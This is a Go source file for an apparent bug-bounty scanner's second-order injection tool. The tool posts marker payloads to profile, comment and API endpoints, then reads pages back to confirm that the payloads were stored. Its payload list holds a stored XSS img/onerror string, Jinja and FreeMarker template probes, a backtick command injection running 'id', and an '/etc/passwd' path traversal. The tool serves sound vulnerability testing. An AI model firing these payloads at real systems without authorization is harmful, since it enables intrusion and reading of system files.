package tools

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"io"
	"log/slog"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"

	"golang.org/x/time/rate"
)

type SecondOrderTool struct{}

type injectionPayload struct {
	Class      string
	WriteValue string // what we POST
	ReadMarker string // unique suffix we look for in the read phase
}

func (t *SecondOrderTool) Name() string {
	return "second_order"
}

func uuid4short() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func (t *SecondOrderTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 10
	}
	pool := NewWorkerPoolWithName(threads, rate.Limit(rateLimit), t.Name())

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}
		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		client := NewSafeHTTPClient(12 * time.Second)

		payloads := t.buildPayloads()
		writeLimiter := rate.NewLimiter(5, 10)

		// Stage 1: Write phase
		// Track which (writeURL, marker) pairs we successfully wrote.
		type writeRecord struct {
			writeURL string
			payload  injectionPayload
			reqDump  string
		}
		var writes []writeRecord

		writeEndpoints := []string{
			"/profile", "/settings", "/comment", "/message",
			"/bio", "/about", "/name", "/update", "/feedback",
			"/api/profile", "/api/user", "/api/settings",
			"/api/comments", "/api/messages",
		}

		for _, targetURL := range targets {
			if parsedURL, err := url.Parse(targetURL); err == nil && parsedURL.RawQuery != "" {

				baseClean := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path
				writeEndpoints = append(writeEndpoints, strings.TrimPrefix(baseClean, target))
			}
		}

		for _, payload := range payloads {
			for _, endpoint := range writeEndpoints {
				if err := writeLimiter.Wait(ctx); err != nil {
					return nil, ctx.Err()
				}
				writeURL := strings.TrimSuffix(target, "/") + endpoint
				if strings.HasPrefix(endpoint, "http") {
					writeURL = endpoint
				}
				for _, method := range []string{"POST", "PUT", "PATCH"} {
					body := fmt.Sprintf(
						`{"name":%q,"bio":%q,"about":%q,"message":%q,"comment":%q,"value":%q}`,
						payload.WriteValue, payload.WriteValue, payload.WriteValue,
						payload.WriteValue, payload.WriteValue, payload.WriteValue,
					)
					req, err := http.NewRequestWithContext(ctx, method, writeURL, strings.NewReader(body))
					if err != nil {
						continue
					}
					for k, v := range scanCtx.Headers {
						req.Header.Set(k, v)
					}
					req.Header.Set("Content-Type", "application/json")
					reqDump, _ := httputil.DumpRequestOut(req, true)

					resp, err := client.Do(req)
					if err != nil {
						continue
					}

					respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 16*1024))
					resp.Body.Close()

					accepted := resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 204
					if !accepted {
						continue
					}

					if strings.Contains(string(respBody), payload.ReadMarker) {
						slog.Debug("Second-order: marker in immediate response — skipping as echo-back",
							"target", writeURL, "class", payload.Class)
						continue
					}

					slog.Info("Second-order write accepted", "url", writeURL, "class", payload.Class, "method", method)
					writes = append(writes, writeRecord{writeURL: writeURL, payload: payload, reqDump: string(reqDump)})
					break
				}
			}
		}

		if len(writes) == 0 {
			return nil, nil
		}

		delay := 15 * time.Second
		select {
		case <-time.After(delay):
		case <-ctx.Done():
			return nil, ctx.Err()
		}

		base := strings.TrimSuffix(target, "/")
		readURLs := []string{
			base + "/",
			base + "/profile",
			base + "/settings",
			base + "/dashboard",
			base + "/admin",
			base + "/api/users/me",
			base + "/api/profile",
			base + "/api/settings",
			base + "/api/user",
			base + "/logs",
			base + "/audit",
			base + "/admin/dashboard",
			base + "/admin/users",
		}

		var events []recon.Event
		for _, readURL := range readURLs {
			status, body, respDump := t.doGET(ctx, client, readURL, scanCtx.Headers)
			if status == 0 {
				continue
			}
			bodyStr := string(body)

			for _, w := range writes {
				if !strings.Contains(bodyStr, w.payload.ReadMarker) {
					continue
				}

				slog.Warn("Second-order injection confirmed",
					"target", target, "read_url", readURL,
					"class", w.payload.Class, "marker", w.payload.ReadMarker)

				events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
					"vuln_name":   fmt.Sprintf("Second-Order Injection (%s)", w.payload.Class),
					"severity":    "critical",
					"write_url":   w.writeURL,
					"read_url":    readURL,
					"marker":      w.payload.ReadMarker,
					"class":       w.payload.Class,
					"status":      fmt.Sprintf("%d", status),
					"description": fmt.Sprintf("Unique marker '%s' injected at %s appeared at %s — stored %s confirmed.", w.payload.ReadMarker, w.writeURL, readURL, w.payload.Class),
					"request":     w.reqDump,
					"response":    respDump,
				}, "critical"))
			}
		}

		return events, nil
	})
}

func (t *SecondOrderTool) buildPayloads() []injectionPayload {
	id := uuid4short()
	return []injectionPayload{
		{

			Class:      "stored_xss",
			WriteValue: fmt.Sprintf(`<img src=x id=bbpts-%s onerror=alert(1)>`, id),
			ReadMarker: fmt.Sprintf(`bbpts-%s`, id),
		},
		{

			Class:      "stored_ssti_jinja",
			WriteValue: fmt.Sprintf(`bbpts-%s-{{7*7}}`, id),
			ReadMarker: fmt.Sprintf(`bbpts-%s-49`, id),
		},
		{

			Class:      "stored_ssti_freemarker",
			WriteValue: fmt.Sprintf(`bbpts-%s-${7*7}`, id),
			ReadMarker: fmt.Sprintf(`bbpts-%s-49`, id),
		},
		{

			Class:      "stored_cmdi",
			WriteValue: fmt.Sprintf("`id #bbpts-%s`", id),
			ReadMarker: "uid=",
		},
		{

			Class:      "stored_path_traversal",
			WriteValue: `../../../etc/passwd`,
			ReadMarker: `root:x:0:`,
		},
	}
}

func (t *SecondOrderTool) doGET(ctx context.Context, client *http.Client, targetURL string, baseHeaders map[string]string) (int, []byte, string) {
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return 0, nil, ""
	}
	for k, v := range baseHeaders {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, nil, ""
	}
	defer resp.Body.Close()
	respDump, _ := httputil.DumpResponse(resp, false)
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return resp.StatusCode, body, string(respDump)
}

var _ recon.Tool = (*SecondOrderTool)(nil)
